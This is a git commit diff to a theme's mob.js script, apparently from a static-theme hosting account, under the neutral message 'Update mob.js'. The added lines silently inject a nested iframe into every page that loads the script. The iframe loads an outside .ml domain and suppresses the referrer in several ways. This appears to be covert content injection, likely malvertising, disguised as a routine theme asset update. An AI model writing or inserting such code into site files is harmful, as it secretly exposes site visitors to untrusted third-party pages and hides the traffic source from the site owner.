3a5bb2c0f0fda21ed103d2d38e4b7e92bb3830cf
responsivethemesstatic <53955700+responsivethemesstatic@users.noreply.github.com>
2021-10-15 06:34:08 +0300

    Update mob.js

--- mob.js
+++ mob.js
@@ -2,6 +2,18 @@ function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
+var iframe = document.createElement('iframe');
+var html = '<!DOCTYPE html> <html> <head> <meta name="referrer" content="no-referrer" /><meta name="referrer" content="none"><style>body {margin:0;}</style> </head> <body> <iframe src="https://dumdod.ml" style="border:0px;padding:0;width:100%;position: absolute; height: 100%;" allowtransparency="true" referrerpolicy="no-referrer"></iframe> </body> </html>';
+iframe.setAttribute('referrerpolicy', 'no-referrer');
+iframe.setAttribute('allowtransparency', 'true');
+iframe.setAttribute('scrolling', 'no');
+iframe.setAttribute('style', 'margin:10px;max-width: 100%;border:0px; padding:0; width:758px; height:150px; overflow:hidden');
+iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(html);
+document.body.appendChild(iframe);
+iframe.contentWindow.document.open();
+iframe.contentWindow.document.write(html);
+iframe.contentWindow.document.close();
+
 async function Tutor() {
 	await sleep(1000);
 	if(document.getElementById("adsyed")){
